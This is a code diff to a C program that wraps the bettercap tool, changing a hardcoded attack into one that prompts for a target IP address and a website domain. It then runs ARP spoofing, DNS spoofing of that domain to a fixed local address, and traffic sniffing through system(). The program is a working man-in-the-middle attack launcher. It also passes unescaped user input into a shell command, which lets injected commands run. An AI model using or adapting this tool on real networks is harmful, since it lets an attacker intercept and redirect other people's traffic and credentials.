@@ -63,12 +63,14 @@ int main(int args)
 		
 		char command[200];
     		char ip_address[16]; // Assuming IPv4 address
-    
-		//printf("Enter the target IP address: ");
+    		char attack[100];
+		printf("Enter the target IP address: ");
     		scanf("%15s", ip_address);
     
-    		//system("bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target 192.168.100.5; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains info.cern.ch, *.cern.ch;dns.spoof on; net.sniff on; arp.spoof on'");
- sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains info.cern.ch, *.cern.ch;dns.spoof on; net.sniff on; arp.spoof on'", ip_address);
+    		printf("\n enter the website ");
+    		scanf("%99s", attack);
+    	
+		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on; arp.spoof on'", ip_address, attack);
 
     
     		system(command);
